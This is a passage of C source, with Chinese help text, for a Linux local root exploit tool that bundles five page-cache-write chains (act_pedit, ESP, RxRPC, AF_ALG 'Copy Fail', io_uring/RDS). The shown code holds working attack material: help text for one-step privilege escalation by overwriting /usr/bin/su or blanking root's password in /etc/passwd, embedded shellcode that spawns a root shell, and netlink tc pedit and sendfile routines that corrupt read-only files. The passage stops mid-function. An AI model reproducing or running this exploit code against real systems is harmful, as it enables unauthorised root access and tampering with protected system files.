		"  CVE-2026-46331   net/sched act_pedit 污染页缓存, 每次 36 字节\n"
		"\n"
		"用法:\n"
		"  %s -2026-31431            显示 31431 的帮助\n"
		"  %s -2026-31431 -start     执行 31431 (Copy Fail 提权)\n"
		"  %s -2026-43284            显示 43284 的帮助\n"
		"  %s -2026-43284 -start     执行 43284 (ESP 提权)\n"
		"  %s -2026-43500            显示 43500 的帮助\n"
		"  %s -2026-43500 -start     执行 43500 (RxRPC 提权)\n"
		"  %s -2026-43494            显示 43494 的帮助\n"
		"  %s -2026-43494 -start     执行 43494 (io_uring/RDS 提权)\n"
		"  %s -2026-46331            显示 46331 的帮助\n"
		"  %s -2026-46331 -start     执行 46331 (pedit 提权)\n"
		"  %s -h                     本帮助\n"
		"\n"
		"公共选项:\n"
		"  -check          只检查内核配置 (配合编号可只查一条链)\n"
		"  -test           五条链自测 (只写临时文件); 带编号只测一条链\n"
		"  -find           扫描 setuid root 文件并评估可用性\n"
		"  -to <f> -set <p> 通用写: 用 p 的内容覆盖 f (31431/43284/43494/46331)\n"
		"  -offset <n>     通用写起始偏移, 默认 0, 支持 0x 前缀\n"
		"  -v              详细日志\n"
		"  -nobackup       写入前不备份目标文件\n"
		"\n"
		"不加 -start 时只打印帮助, 不会执行任何利用动作。\n"
		"旧参数 --esp / --rxrpc / --copyfail 仍然兼容。\n"
		"仅限你拥有或已授权的一次性测试环境使用。\n",
		prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog);
}

static void help_esp(const char *prog)
{
	fprintf(stderr,
		"CVE-2026-43284  XFRM / ESP 页缓存写\n"
		"\n"
		"原理: splice(file -> UDP skb frag) 让文件页成为 skb 的 shared frag,\n"
		"      ESP 原地解密时把 seq_hi (4 字节) 写回该页 —— 越权改只读文件。\n"
		"\n"
		"用法:\n"
		"  %s -2026-43284 -start                       一键提权: 写 /usr/bin/su 内置 payload\n"
		"  %s -2026-43284 -start --corrupt-only        只改页缓存, 不弹 shell\n"
		"  %s -2026-43284 -to <文件> -set <内容> [-offset N] 通用写\n"
		"  %s -2026-43284 -check                       只检查 ESP 链所需配置\n"
		"\n"
		"选项:\n"
		"  -start          真正执行 (不加则只打印本帮助)\n"
		"  -to <file>      通用写目标文件 (需配合 -set)\n"
		"  -set <file>     用该文件内容覆盖目标\n"
		"  -offset <n>     通用写起始偏移, 默认 0, 支持 0x 前缀\n"
		"  --corrupt-only  只写页缓存, 不继续提权\n"
		"  -nobackup       不备份目标\n"
		"  -v              详细日志\n"
		"  -test           自测本链写原语 (只写临时文件, 不碰系统文件)\n"
		"\n"
		"前提: 需要非特权 user namespace 才能拿到 CAP_NET_ADMIN 注册 SA。\n"
		"      若发行版禁用了 unprivileged_userns_clone, 需以 root 运行。\n"
		"      先跑 %s -2026-43284 -check 确认配置。\n",
		prog, prog, prog, prog, prog);
}

static void help_rxrpc(const char *prog)
{
	fprintf(stderr,
		"CVE-2026-43500  RxRPC / RXKAD 页缓存写\n"
		"\n"
		"原理: splice 把文件页挂成 rxrpc DATA 包的 shared frag, rxkad 用\n"
		"      pcbc(fcrypt) 原地解密 8 字节, 直接写回该页。\n"
		"      搜索 session key 让解密结果等于目标值, 三次叠加写把\n"
		"      /etc/passwd 首行改成 root::0:0:... -> su 免密 -> root。\n"
		"\n"
		"用法:\n"
		"  %s -2026-43500 -start                一键提权 (改 /etc/passwd)\n"
		"  %s -2026-43500 -start --corrupt-only 只改页缓存并用 getent 验证, 不弹 shell\n"
		"  %s -2026-43500 -start -t <文件>      指定目标 (默认 /etc/passwd)\n"
		"  %s -2026-43500 -check                只检查 rxrpc 链所需配置\n"
		"\n"
		"选项:\n"
		"  -start            真正执行 (不加则只打印本帮助)\n"
		"  -t, --target <f>  目标文件 (默认 /etc/passwd)\n"
		"  --corrupt-only    只写页缓存, 不继续提权\n"
		"  -nobackup         不备份目标\n"
		"  -v                详细日志\n"
		"  -test           自测本链写原语 (只写临时文件, 不碰系统文件)\n"
		"\n"
		"前提: 不需要 user namespace; 需要 RXKAD + AF_ALG(pcbc/fcrypt)。\n"
		"      先跑 %s -2026-43500 -check 确认配置。\n",
		prog, prog, prog, prog, prog);
}

static void help_copy(const char *prog)
{
	fprintf(stderr,
		"CVE-2026-31431  Copy Fail —— AF_ALG algif_aead 页缓存写\n"
		"\n"
		"原理: algif_aead 的 in-place 优化让 splice() 进来的文件页直接成为\n"
		"      解密输出; authencesn 为支持 ESN 会在收尾处把 4 字节 seqno\n"
		"      写到 assoclen+cryptlen 之后, 越界落到该页 -> 任意文件页缓存\n"
		"      指定偏移可写 4 字节。无竞争、无 userns、无 capability。\n"
		"\n"
		"用法:\n"
		"  %s -2026-31431 -start                       一键提权: 写 /usr/bin/su\n"
		"  %s -2026-31431 -start --corrupt-only        只改页缓存, 不弹 shell\n"
		"  %s -2026-31431 -to <文件> -set <内容> [-offset N] 通用写\n"
		"  %s -2026-31431 -check                       只检查本链所需配置\n"
		"\n"
		"选项:\n"
		"  -start          真正执行 (不加则只打印本帮助)\n"
		"  -t, --target <f> 固定利用时的目标文件 (默认 /usr/bin/su)\n"
		"  -to <file>      通用写目标文件 (需配合 -set)\n"
		"  -set <file>     用该文件内容覆盖目标\n"
		"  -offset <n>     通用写起始偏移, 默认 0, 支持 0x 前缀\n"
		"  --corrupt-only  只写页缓存, 不继续提权\n"
		"  -nobackup       不备份目标\n"
		"  -v              详细日志\n"
		"  -test           自测本链写原语 (只写临时文件, 不碰系统文件)\n"
		"\n"
		"前提: 只需要 AF_ALG AEAD\n"
		"      (CONFIG_CRYPTO_USER_API_AEAD + authencesn/aes/cbc/hmac/sha256)。\n"
		"      不需要 user namespace、不需要 CAP_NET_ADMIN, 三条链里门槛最低。\n"
		"      先跑 %s -2026-31431 -check 确认配置。\n",
		prog, prog, prog, prog, prog);
}

static void help_pedit(const char *prog)
{
	fprintf(stderr,
		"CVE-2026-46331  net/sched act_pedit 页缓存污染\n"
		"\n"
		"原理: userns+netns 里拿到 CAP_NET_ADMIN, 在 lo 上装 clsact 过滤器,\n"
		"      挂 pedit 动作改写 TCP 头某个 4 字节窗口; sendfile() 把目标\n"
		"      文件送进 loopback socket, skb frag 直接引用文件页, pedit 在\n"
		"      partial COW 路径原地改 -> 写穿页缓存。单次最多 36 字节。\n"
		"\n"
		"用法:\n"
		"  %s -2026-46331 -start                  一键提权 (覆盖 su 入口)\n"
		"  %s -2026-46331 -start -t <文件>        指定 setuid 目标\n"
		"  %s -2026-46331 -to <文件> -set <内容>  通用写 (自动分块)\n"
		"  %s -2026-46331 -check                  检查本链所需配置与能力\n"
		"\n"
		"选项:\n"
		"  -start          真正执行 (不加则只打印本帮助)\n"
		"  -t, --target <f> 目标文件 (默认自动找 setuid-root su)\n"
		"  -to/-set        通用写: 任意偏移, 4 字节槽读-改-写\n"
		"  -offset <n>     通用写起始偏移, 默认 0, 支持 0x 前缀\n"
		"  -nobackup       不备份目标\n"
		"  -v              详细日志\n"
		"  -test           自测本链写原语 (只写临时文件, 不碰系统文件)\n"
		"\n"
		"前提: CONFIG_NET_SCH_PEDIT + CONFIG_NET_CLS_ACT + clsact + userns,\n"
		"      且 tc 过滤器能在新 netns 里装上。\n"
		"      先跑 %s -2026-46331 -check 确认。\n",
		prog, prog, prog, prog, prog);
}

static void help_uaf(const char *prog)
{
	fprintf(stderr,
		"CVE-2026-43494  io_uring + RDS 页引用计数劫持 (page UAF 页缓存写)\n"
		"\n"
		"原理: io_uring 注册用户页 -> refcount +1024 (FOLL_PIN);\n"
		"      克隆缓冲让 imu->refs=2, 阻止 ring 清理时 unpin;\n"
		"      再用 RDS zerocopy 发送失败逐次偷引用, 1024 次后回到 1;\n"
		"      munmap 后该 struct page 释放到 PCP 栈顶,\n"
		"      立刻读 setuid 文件让页缓存复用同一页 -> io_uring 里成了悬空指针;\n"
		"      最后 IORING_OP_READ_FIXED 用 DMA 整页覆盖 -> 执行即 root。\n"
		"\n"
		"用法:\n"
		"  %s -2026-43494 -start                   一键提权 (自动挑 setuid 目标)\n"
		"  %s -2026-43494 -start -t <文件>         指定 setuid 目标\n"
		"  %s -2026-43494 -to <文件> -set <内容>   整页写: 用内容覆盖目标页, 不执行\n"
		"  %s -2026-43494 -check                   检查本链所需配置与内核能力\n"
		"\n"
		"选项:\n"
		"  -start          真正执行 (不加则只打印本帮助)\n"
		"  -t, --target <f> 目标 setuid 文件\n"
		"  -to/-set        整页 4096 字节写入, 需页对齐 (-offset)\n"
		"  -nobackup       不备份目标\n"
		"  -v              详细日志\n"
		"  -test           自测本链写原语 (只写临时文件, 不碰系统文件)\n"
		"\n"
		"前提: CONFIG_IO_URING + CONFIG_RDS (+ RDS_TCP), 且内核支持\n"
		"      IORING_REGISTER_CLONE_BUFFERS (6.12+ 才有; 老内核第 2 步直接 EINVAL)。\n"
		"      先跑 %s -2026-43494 -check 确认。\n",
		prog, prog, prog, prog, prog);
}

/* =====================================================================
 * 第五条链: CVE-2026-46331  net/sched act_pedit 部分写时复制
 *
 *  1) unshare(CLONE_NEWUSER|CLONE_NEWNET) 拿到本 netns 的 CAP_NET_ADMIN
 *  2) 在 lo 上装 clsact + (basic+pkt_len 匹配 / matchall) 过滤器
 *  3) 过滤器里挂 pedit 动作, 把 TCP 头里某个 4 字节窗口改成目标值
 *  4) 用 sendfile() 把目标文件送进 loopback socket, skb frag 直接引用文件页
 *  5) pedit 在 partial COW 路径上原地改 skb 数据 -> 写穿到页缓存
 *  6) 同一 fd 反复送 -> 每次 36 字节窗口, 拼出任意长度的页缓存写
 *
 * 与 43284 / 31431 的区别: 这里不需要 userns 以外的任何东西, 也不需要
 * 加密算法; 但每次只能写 36 字节, 且必须在 4 字节槽上做读-改-写。
 * ===================================================================== */
#define PEDIT_SLOT       4      /* 一个 pedit key 写 4 字节 */
#define PEDIT_MAX_WRITE  36     /* 单次调用窗口上限 (ihl 15) */
#define PD_MAX_KEYS      (1 + PEDIT_MAX_WRITE / PEDIT_SLOT)

/* 48 字节: setgid(0); setuid(0); execve("/bin/sh", {"/bin/sh", NULL}, NULL) */
static const unsigned char pd_shellcode[] = {
	0x31, 0xff,
	0xb8, 0x6a, 0x00, 0x00, 0x00,
	0x0f, 0x05,
	0xb8, 0x69, 0x00, 0x00, 0x00,
	0x0f, 0x05,
	0x48, 0x31, 0xd2,
	0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
	0x53,
	0x48, 0x89, 0xe7,
	0x52,
	0x57,
	0x48, 0x89, 0xe6,
	0xb8, 0x3b, 0x00, 0x00, 0x00,
	0x0f, 0x05,
	0x90, 0x90, 0x90,
};

static void write_proc_str(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	ssize_t n;

	if (fd < 0)
		return;
	n = write(fd, val, strlen(val));
	(void)n;
	close(fd);
}

static const char *pd_su_paths[] = {
	"/usr/bin/su", "/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
};

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_pedit.h>

#define IP_IHL_KEY_OFFSET       0
#define IP_IHL_KEY_VALUE        0x4fu           /* version 4, ihl 15 */
#define IP_IHL_KEY_MASK         0xffffff00u     /* keep tos / tot_len bytes */
#define MAX_PEDIT_KEYS          (1 + PEDIT_MAX_WRITE / PEDIT_SLOT)

#define LOOPBACK_ADDR           0x7f000001u
#define LOOPBACK_PREFIX         8
#define LOOPBACK_PORT           4445
#define LISTEN_BACKLOG          8
#define SETTLE_USEC             250000

#define CALIB_PATH              "/tmp/.pedit_calib"
#define CALIB_LEN               4096
#define CALIB_PROBE_OFFSET      512
#define CALIB_MARK_BYTE         0xccu

#define REQUEST_BUF_LEN         8192
#define REPLY_BUF_LEN           4096
#define FILTER_PRIO             1
#define ACTION_LIST_FIRST       1

#ifndef NLA_F_NESTED
#define NLA_F_NESTED            (1 << 15)
#endif
#ifndef TC_H_CLSACT
#define TC_H_CLSACT             TC_H_INGRESS
#endif
#ifndef TC_H_MIN_EGRESS
#define TC_H_MIN_EGRESS         0xFFF3u
#endif
#ifndef TC_ACT_PIPE
#define TC_ACT_PIPE             3
#endif
#ifndef TCA_MATCHALL_ACT
#define TCA_MATCHALL_ACT        2
#endif

/* pkt_len ematch (subset of <linux/tc_ematch/tc_em_meta.h>) -- scope the filter to
 * the big sendfile data skb so ACK/handshake skbs never reach the out-of-range
 * pedit write that would otherwise log "tc action pedit offset N out of bounds". */
#define MIN_DATA_PKT_LEN        100
#ifndef TCA_EM_META_HDR
#define TCA_EM_META_HDR         1
#define TCA_EM_META_RVALUE      3
#endif
#define META_TYPE_INT           1
#define META_ID_PKTLEN          9
#define META_ID_VALUE           0
#define META_KIND_PKTLEN        ((META_TYPE_INT << 12) | META_ID_PKTLEN)
#define META_KIND_VALUE         ((META_TYPE_INT << 12) | META_ID_VALUE)

struct meta_value {
    uint16_t kind;
    uint8_t shift;
    uint8_t op;
};

struct meta_header {
    struct meta_value left;
    struct meta_value right;
};

struct pedit_key_spec {
    uint32_t offset;
    uint32_t value;
    uint32_t mask;
    uint16_t header_type;
};

static int pd_nl_fd = -1;
static int pd_lo_index;
static int pd_listen_fd = -1;
static int pd_delta;            /* file_offset = key_offset + pd_delta */
static int pd_use_matchall;            /* set when cls_basic / em_meta are absent (e.g. RHEL) */

/* ============================ rtnetlink request ============================ */

static unsigned int pd_req_seq = 1;
static char pd_req_buf[REQUEST_BUF_LEN];
static struct nlmsghdr *pd_req_hdr;

static void pd_req_begin(int type, int flags)
{
    memset(pd_req_buf, 0, sizeof(pd_req_buf));
    pd_req_hdr = (struct nlmsghdr *)pd_req_buf;
    pd_req_hdr->nlmsg_len = NLMSG_HDRLEN;
    pd_req_hdr->nlmsg_type = type;
    pd_req_hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    pd_req_hdr->nlmsg_seq = pd_req_seq++;
}

static void *pd_req_reserve(int length)
{
    void *area = (char *)pd_req_buf + NLMSG_ALIGN(pd_req_hdr->nlmsg_len);

    pd_req_hdr->nlmsg_len = NLMSG_ALIGN(pd_req_hdr->nlmsg_len) + length;
    return area;
}

static void pd_req_append(const void *data, int length)
{
    memcpy(pd_req_reserve(length), data, length);
}

static void pd_req_attr(int type, const void *data, int length)
{
    struct rtattr *attr = pd_req_reserve(RTA_LENGTH(length));

    attr->rta_type = type;
    attr->rta_len = RTA_LENGTH(length);
    memcpy(RTA_DATA(attr), data, length);
}

static void pd_req_attr_str(int type, const char *text)
{
    pd_req_attr(type, text, strlen(text) + 1);
}

static struct rtattr *pd_req_nest_begin(int type)
{
    struct rtattr *attr = pd_req_reserve(RTA_LENGTH(0));

    attr->rta_type = type | NLA_F_NESTED;
    attr->rta_len = RTA_LENGTH(0);
    return attr;
}

/* like pd_req_nest_begin but without NLA_F_NESTED -- for the ematch entry whose
 * payload is a raw tcf_ematch_hdr followed by attributes. */
static struct rtattr *pd_req_blob_begin(int type)
{
    struct rtattr *attr = pd_req_reserve(RTA_LENGTH(0));

    attr->rta_type = type;
    attr->rta_len = RTA_LENGTH(0);
    return attr;
}

static void pd_req_nest_end(struct rtattr *attr)
{
    attr->rta_len = (char *)pd_req_buf + pd_req_hdr->nlmsg_len - (char *)attr;
}

static int pd_req_send(int allow_enoent)
{
    char reply_buf[REPLY_BUF_LEN];
    struct nlmsghdr *reply;
    struct nlmsgerr *reply_error;
    int received;

    if (send(pd_nl_fd, pd_req_buf, pd_req_hdr->nlmsg_len, 0) < 0)
        return -1;
    received = recv(pd_nl_fd, reply_buf, sizeof(reply_buf), 0);
    if (received < 0)
        return -1;
    reply = (struct nlmsghdr *)reply_buf;
    if (reply->nlmsg_type != NLMSG_ERROR)
        return 0;
    reply_error = NLMSG_DATA(reply);
    if (reply_error->error && !(allow_enoent && reply_error->error == -ENOENT))
        return reply_error->error;
    return 0;
}

/* ============================== link / qdisc ============================== */

static int pd_link_up(int index)
{
    struct ifinfomsg link;

    pd_req_begin(RTM_NEWLINK, 0);
    memset(&link, 0, sizeof(link));
    link.ifi_family = AF_UNSPEC;
    link.ifi_index = index;
    link.ifi_flags = IFF_UP;
    link.ifi_change = IFF_UP;
    pd_req_append(&link, sizeof(link));
    return pd_req_send(0);
}

/* assign 127.0.0.1/8 to lo -- a no-op in the init netns, required in a fresh
 * netns (unshare(NEWNET)) where lo comes up with no address. */
static int pd_link_set_addr(int index, uint32_t addr)
{
    struct ifaddrmsg ifaddr;
    uint32_t addr_be = htonl(addr);

    pd_req_begin(RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE);
    memset(&ifaddr, 0, sizeof(ifaddr));
    ifaddr.ifa_family = AF_INET;
    ifaddr.ifa_prefixlen = LOOPBACK_PREFIX;
    ifaddr.ifa_index = index;
    pd_req_append(&ifaddr, sizeof(ifaddr));
    pd_req_attr(IFA_LOCAL, &addr_be, sizeof(addr_be));
    pd_req_attr(IFA_ADDRESS, &addr_be, sizeof(addr_be));
    return pd_req_send(0);
}

static void pd_clsact_del(int index)
{
    struct tcmsg msg;

    pd_req_begin(RTM_DELQDISC, 0);
    memset(&msg, 0, sizeof(msg));
    msg.tcm_family = AF_UNSPEC;
    msg.tcm_ifindex = index;
    msg.tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    msg.tcm_parent = TC_H_CLSACT;
    pd_req_append(&msg, sizeof(msg));
    pd_req_send(1);                            // ENOENT 表示本来就没有, 忽略
}

static int pd_clsact_add(int index)
{
    struct tcmsg msg;

    pd_req_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL);
    memset(&msg, 0, sizeof(msg));
    msg.tcm_family = AF_UNSPEC;
    msg.tcm_ifindex = index;
    msg.tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    msg.tcm_parent = TC_H_CLSACT;
    pd_req_append(&msg, sizeof(msg));
    pd_req_attr_str(TCA_KIND, "clsact");
    return pd_req_send(0);
}

/* ============================== pedit filter ============================== */

/* basic-classifier ematch tree that matches only skbs with skb->len > threshold. */
static void pd_append_ematch(uint32_t threshold)
{
    struct tcf_ematch_tree_hdr tree_header;
    struct tcf_ematch_hdr match_header;
    struct meta_header meta;
    struct rtattr *ematches;
    struct rtattr *match_list;
    struct rtattr *match;

    ematches = pd_req_nest_begin(TCA_BASIC_EMATCHES);

    memset(&tree_header, 0, sizeof(tree_header));
    tree_header.nmatches = 1;
    pd_req_attr(TCA_EMATCH_TREE_HDR, &tree_header, sizeof(tree_header));

    match_list = pd_req_nest_begin(TCA_EMATCH_TREE_LIST);
    match = pd_req_blob_begin(1);              // ematch #1: raw header + meta attrs

    memset(&match_header, 0, sizeof(match_header));
    match_header.kind = TCF_EM_META;
    match_header.flags = TCF_EM_REL_END;
    pd_req_append(&match_header, sizeof(match_header));

    memset(&meta, 0, sizeof(meta));
    meta.left.kind = META_KIND_PKTLEN;          // left operand: skb->len
    meta.left.op = TCF_EM_OPND_GT;              // match when left > right
    meta.right.kind = META_KIND_VALUE;          // right operand: the constant below
    pd_req_attr(TCA_EM_META_HDR, &meta, sizeof(meta));
    pd_req_attr(TCA_EM_META_RVALUE, &threshold, sizeof(threshold));

    pd_req_nest_end(match);
    pd_req_nest_end(match_list);
    pd_req_nest_end(ematches);
}

/* Emit one pedit action entry (kind + selector + per-key extensions) into the
 * action-list nest that the caller has already opened. */
static void pd_append_pedit(const struct pedit_key_spec *keys, int key_count)
{
    char selector_buf[sizeof(struct tc_pedit_sel) + MAX_PEDIT_KEYS * sizeof(struct tc_pedit_key)];
    struct tc_pedit_sel *selector = (void *)selector_buf;
    struct tc_pedit_key *raw_keys = (void *)(selector_buf + sizeof(*selector));
    struct rtattr *action;
    struct rtattr *action_options;
    struct rtattr *keys_ex;
    struct rtattr *key_ex;
    uint16_t header_type;
    uint16_t command;
    int selector_len;
    int index_iter;

    action = pd_req_nest_begin(ACTION_LIST_FIRST);
    pd_req_attr_str(TCA_ACT_KIND, "pedit");
    action_options = pd_req_nest_begin(TCA_ACT_OPTIONS);

    selector_len = sizeof(*selector) + key_count * sizeof(struct tc_pedit_key);
    memset(selector_buf, 0, selector_len);
    selector->nkeys = key_count;
    selector->action = TC_ACT_PIPE;
    for (index_iter = 0; index_iter < key_count; index_iter++) {
        raw_keys[index_iter].off = keys[index_iter].offset;
        raw_keys[index_iter].val = keys[index_iter].value;
        raw_keys[index_iter].mask = keys[index_iter].mask;
    }
    pd_req_attr(TCA_PEDIT_PARMS_EX, selector_buf, selector_len);

    keys_ex = pd_req_nest_begin(TCA_PEDIT_KEYS_EX);
    for (index_iter = 0; index_iter < key_count; index_iter++) {
        key_ex = pd_req_nest_begin(TCA_PEDIT_KEY_EX);
        header_type = keys[index_iter].header_type;
        pd_req_attr(TCA_PEDIT_KEY_EX_HTYPE, &header_type, sizeof(header_type));
        command = TCA_PEDIT_KEY_EX_CMD_SET;
        pd_req_attr(TCA_PEDIT_KEY_EX_CMD, &command, sizeof(command));
        pd_req_nest_end(key_ex);
    }
    pd_req_nest_end(keys_ex);
    pd_req_nest_end(action_options);
    pd_req_nest_end(action);
}

/* Install the egress pedit filter. Prefer the basic classifier scoped by a
 * pkt_len ematch (only the data skb is touched, no out-of-range log spam); on
 * kernels without cls_basic / em_meta (e.g. RHEL) fall back to matchall, which
 * fires on every egress skb -- still armed only after the handshake. */
static int pd_egress_add(int index, const struct pedit_key_spec *keys, int key_count)
{
    struct rtattr *options;
    struct rtattr *action_list;
    struct tcmsg msg;

    pd_req_begin(RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL);
    memset(&msg, 0, sizeof(msg));
    msg.tcm_family = AF_UNSPEC;
    msg.tcm_ifindex = index;
    msg.tcm_parent = TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS);
    msg.tcm_info = TC_H_MAKE(FILTER_PRIO << 16, htons(ETH_P_ALL));
    pd_req_append(&msg, sizeof(msg));

    if (pd_use_matchall) {
        pd_req_attr_str(TCA_KIND, "matchall");
        options = pd_req_nest_begin(TCA_OPTIONS);
        action_list = pd_req_nest_begin(TCA_MATCHALL_ACT);
    } else {
        pd_req_attr_str(TCA_KIND, "basic");
        options = pd_req_nest_begin(TCA_OPTIONS);
        pd_append_ematch(MIN_DATA_PKT_LEN); // match only the sendfile data skb
        action_list = pd_req_nest_begin(TCA_BASIC_ACT);
    }
    pd_append_pedit(keys, key_count);
    pd_req_nest_end(action_list);
    pd_req_nest_end(options);
    return pd_req_send(0);
}

/* ============================== burst engine ============================== */

static void pd_fill_ihl(struct pedit_key_spec *key)
{
    key->offset = IP_IHL_KEY_OFFSET;
    key->value = IP_IHL_KEY_VALUE;
    key->mask = IP_IHL_KEY_MASK;
    key->header_type = TCA_PEDIT_KEY_EX_HDR_TYPE_NETWORK;
}

/* sendfile src_fd over a fresh loopback connection, arming `keys` on lo egress
 * only AFTER the handshake so the corruption rides the data, not the SYNs. */
static int pd_burst(int src_fd, const struct pedit_key_spec *keys, int key_count)
{
    struct sockaddr_in addr;
    struct stat info;
    off_t file_offset = 0;
    int client_fd;
    int server_fd;

    if (fstat(src_fd, &info))
        return -1;

    pd_clsact_del(pd_lo_index);              // clean slate: no filter during handshake
    if (pd_clsact_add(pd_lo_index))
        return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_ADDR);
    addr.sin_port = htons(LOOPBACK_PORT);
    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd < 0)
        return -1;
    if (connect(client_fd, (void *)&addr, sizeof(addr))) {
        close(client_fd);
        return -1;
    }
    server_fd = accept(pd_listen_fd, NULL, NULL);
    if (server_fd < 0) {
        close(client_fd);
        return -1;
    }

    if (pd_egress_add(pd_lo_index, keys, key_count)) {   // arm AFTER handshake
        close(client_fd);
        close(server_fd);
        return -1;
    }
    fcntl(client_fd, F_SETFL, O_NONBLOCK);
    if (sendfile(client_fd, src_fd, &file_offset, info.st_size) < 0 && errno != EAGAIN) {
        close(client_fd);
        close(server_fd);
        return -1;
    }
    usleep(SETTLE_USEC);
    close(client_fd);
    close(server_fd);
    return 0;
}

/* ============================== calibration =============================== */

/* Land a marker at a known key offset and read it back so pd_write_fd() can
 * translate a file offset into the matching pedit key offset on any geometry. */
static int pd_calibrate(void)
{
    struct pedit_key_spec keys[2];
    uint8_t buf[CALIB_LEN];
    int fd;
    int index_iter;
    int landed = -1;

    fd = open(CALIB_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return -1;
    memset(buf, 0, sizeof(buf));
    if (write(fd, buf, sizeof(buf)) != sizeof(buf)) {
        close(fd);
        return -1;
    }
    fsync(fd);

    pd_fill_ihl(&keys[0]);
    keys[1].offset = CALIB_PROBE_OFFSET;
    keys[1].value = CALIB_MARK_BYTE * 0x01010101u;
    keys[1].mask = 0;
    keys[1].header_type = TCA_PEDIT_KEY_EX_HDR_TYPE_TCP;
    if (pd_burst(fd, keys, 2)) {
        close(fd);
        return -1;
    }

    if (pread(fd, buf, sizeof(buf), 0) != sizeof(buf)) {
        close(fd);
        return -1;
    }
    for (index_iter = 0; index_iter + PEDIT_SLOT <= CALIB_LEN; index_iter++) {
        if (buf[index_iter] == CALIB_MARK_BYTE &&
            buf[index_iter + 1] == CALIB_MARK_BYTE &&
            buf[index_iter + 2] == CALIB_MARK_BYTE &&
            buf[index_iter + 3] == CALIB_MARK_BYTE) {
            landed = index_iter;
            break;
        }
    }
    close(fd);
    unlink(CALIB_PATH);
    if (landed < 0)
        return -1;
    pd_delta = landed - CALIB_PROBE_OFFSET;
    return 0;
}

/* ================================= api ==================================== */

int pd_setup(void)
{
    struct sockaddr_in addr;
    int reuse = 1;

    pd_nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (pd_nl_fd < 0) {
        WARN("netlink socket 失败: %s", strerror(errno));
        return -1;
    }
    pd_lo_index = if_nametoindex("lo");
    if (!pd_lo_index) {
        WARN("找不到 lo 接口");
        return -1;
    }
    if (pd_link_up(pd_lo_index)) {
        WARN("拉起 lo 失败 (netns 内没有 CAP_NET_ADMIN?)");
        return -1;
    }
    pd_link_set_addr(pd_lo_index, LOOPBACK_ADDR);   // best effort; bind() below is the gate

    pd_listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (pd_listen_fd < 0)
        return -1;
    setsockopt(pd_listen_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_ADDR);
    addr.sin_port = htons(LOOPBACK_PORT);
    if (bind(pd_listen_fd, (void *)&addr, sizeof(addr))) {
        WARN("绑定 127.0.0.1:%d 失败: %s", LOOPBACK_PORT, strerror(errno));
        return -1;
    }
    if (listen(pd_listen_fd, LISTEN_BACKLOG)) {
        WARN("listen 失败: %s", strerror(errno));
        return -1;
    }

    /* 优先 basic+pkt_len (日志干净); 缺 cls_basic / em_meta 时退回 matchall */
    if (pd_calibrate() == 0)
        return 0;
    LOG("basic/ematch 不可用, 回退 matchall 过滤器");
    pd_use_matchall = 1;
    if (pd_calibrate() == 0)
        return 0;

    WARN("pedit 原语校准失败 —— 常见原因:");
    WARN("  1) 缺 act_pedit 模块 (modprobe act_pedit)");
    WARN("  2) 内核没开 CONFIG_NET_SCH_PEDIT / CONFIG_NET_CLS_ACT");
    WARN("  3) netns 里 clsact 装不上 (容器限制)");
    return -1;
}

int pd_write_fd(int fd, off_t offset, const void *src, size_t size)
{
    struct pedit_key_spec keys[MAX_PEDIT_KEYS];
    const uint8_t *bytes = src;
    int key_count = 0;
    size_t pos;

    if (size == 0)
        return 0;
    if (size > PEDIT_MAX_WRITE || (size % PEDIT_SLOT) != 0)
        return -1;                              // refuse: not a whole-slot run
    if (offset < (off_t)pd_delta)
        return -1;                              // would need a negative key offset

    pd_fill_ihl(&keys[key_count++]);
    for (pos = 0; pos < size; pos += PEDIT_SLOT) {
        keys[key_count].offset = (uint32_t)(offset + pos) - (uint32_t)pd_delta;
        keys[key_count].value = (uint32_t)bytes[pos] |
                                ((uint32_t)bytes[pos + 1] << 8) |
                                ((uint32_t)bytes[pos + 2] << 16) |
                                ((uint32_t)bytes[pos + 3] << 24);
        keys[key_count].mask = 0;
        keys[key_count].header_type = TCA_PEDIT_KEY_EX_HDR_TYPE_TCP;
        key_count++;
    }
    return pd_burst(fd, keys, key_count);
}

/* ========================= CVE-2026-46331 上层封装 ======================== */

/* 取 setuid-root 的 su (或 -t 指定的文件) */
static const char *pd_find_su(const char *prefer)
{
    struct stat st;
    int i;

    if (prefer && *prefer)
        return prefer;
    for (i = 0; pd_su_paths[i]; i++) {
        if (stat(pd_su_paths[i], &st) == 0 && S_ISREG(st.st_mode) &&
            (st.st_mode & S_ISUID) && st.st_uid == 0)
            return pd_su_paths[i];
    }
    return NULL;
}

/* e_entry 在文件里的偏移: 找包含它的可执行 PT_LOAD */
static long pd_entry_offset(int fd)
{
    Elf64_Ehdr ehdr;
    Elf64_Phdr phdr;
    int i;

    if (pread(fd, &ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr))
        return -1;
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0 ||
        ehdr.e_ident[EI_CLASS] != ELFCLASS64)
        return -1;
